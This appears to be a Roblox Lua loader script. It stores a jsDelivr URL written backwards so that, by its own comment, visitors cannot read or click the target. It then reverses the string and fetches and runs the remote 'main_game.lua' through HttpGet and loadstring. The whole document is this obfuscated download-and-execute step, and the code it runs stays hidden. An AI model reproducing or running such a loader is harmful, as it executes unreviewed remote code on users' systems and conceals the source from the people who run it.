-- Reverses the inner link so browser visitors cannot click or read the target URL
local inner_url = string.reverse("aul.emag_niam/stpircs/tsetal@redaol-uaul/relggufmood/hg/nc.rveledsj.ndc//:sptth")
loadstring(game:HttpGet(string.reverse(inner_url)))()
